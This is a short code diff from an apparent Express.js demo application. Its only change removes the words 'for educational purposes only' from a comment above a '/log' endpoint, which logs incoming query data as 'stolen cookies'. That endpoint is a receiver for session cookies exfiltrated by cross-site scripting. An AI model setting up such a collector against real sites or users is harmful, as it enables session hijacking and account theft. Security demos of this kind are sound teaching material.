@@ -82,7 +82,7 @@ app.get('/api/search', (req, res) => {
   `);
 });
 
-// Cookie stealing demonstration endpoint (for educational purposes only)
+// Cookie stealing demonstration endpoint
 app.get('/log', (req, res) => {
   console.log('Received stolen cookies:', req.query);
   res.status(200).send('');
